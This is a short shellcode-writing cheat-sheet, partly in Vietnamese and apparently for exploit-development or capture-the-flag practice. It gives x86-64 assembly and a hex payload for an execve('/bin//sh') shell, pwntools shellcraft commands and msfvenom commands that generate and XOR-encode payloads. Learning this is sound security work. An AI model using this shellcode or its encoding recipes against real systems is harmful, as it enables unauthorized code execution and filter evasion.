# [+] Creating sellcode
---
```bash
[!bash!]$ man -s 2 execve

int execve(const char *pathname, char *const argv[], char *const envp[]);
```

Example: ``execve("/bin//sh", ["/bin//sh"], NULL)``

So, we'll set our arguments as:

- rax -> 59 (execve syscall number)
- rdi -> ['/bin//sh'] (pointer to program to execute)
- rsi -> ['/bin//sh'] (list of pointers for arguments)
- rdx -> NULL (no environment variables)

```shell
_start:
    mov al, 59          ; execve syscall number
    xor rdx, rdx        ; set env to NULL
    push rdx            ; push NULL string terminator
    mov rdi, '/bin//sh' ; first arg to /bin/sh
    push rdi            ; push to stack 
    mov rdi, rsp        ; move pointer to ['/bin//sh']
    push rdx            ; push NULL string terminator
    push rdi            ; push second arg to ['/bin//sh']
    mov rsi, rsp        ; pointer to args
    syscall
```

**/bin/sh**
```shell
python3 loader.py 'b03b4831d25248bf2f62696e2f2f7368574889e752574889e60f05'
```

# [+] Shellcraft
---
Hãy bắt đầu với các công cụ thông thường của chúng ta, pwntools, và sử dụng thư viện shellcraft của nó, thư viện này tạo ra shellcode cho các syscall khác nhau.
```shell
pwn shellcraft -l 'amd64.linux'
```

Example: Cat flag.txt in dir /bin/flag.txt
```shell
pwn shellcraft amd64.linux.cat "/bin/flag.txt"
```


# [+] Msfvenom
---
```shell
msfvenom -p 'linux/x64/exec' CMD='<COMMAND>' -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor'
```
Nếu có một shellcode tùy chỉnh mà chúng ta đã viết, chúng ta cũng có thể sử dụng msfvenom để mã hóa nó, bằng cách ghi các byte của nó vào một tệp rồi chuyển nó tới msfvenom với -p -, như sau:
```bash
$ python3 -c "import sys; sys.stdout.buffer.write(bytes.fromhex('b03b4831d25248bf2f62696e2f2f7368574889e752574889e60f05'))" > shell.bin
$ msfvenom -p - -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor' < shell.bin
```




